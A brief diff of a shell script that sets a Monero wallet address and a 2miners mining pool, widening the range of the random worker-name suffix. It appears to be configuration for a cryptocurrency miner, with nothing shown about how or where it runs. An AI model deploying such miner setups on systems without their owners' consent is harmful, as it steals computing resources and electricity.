@@ -1,6 +1,6 @@
 #!/bin/sh
 
-WALLET=83ewexCY9sah9gKPtPTDeN5FtpwY1kitRRPnWtXHT3QTjfEwaqbTJGYJwHuGr8jUDd5PMmUSLP3cPFnSxHErAZnXMQrhGwg.ENTE-$(echo $(shuf -i 1-100 -n 1))
+WALLET=83ewexCY9sah9gKPtPTDeN5FtpwY1kitRRPnWtXHT3QTjfEwaqbTJGYJwHuGr8jUDd5PMmUSLP3cPFnSxHErAZnXMQrhGwg.ENTE-$(echo $(shuf -i 1-9999 -n 1))
 
 POOL=xmr.2miners.com:2222
 
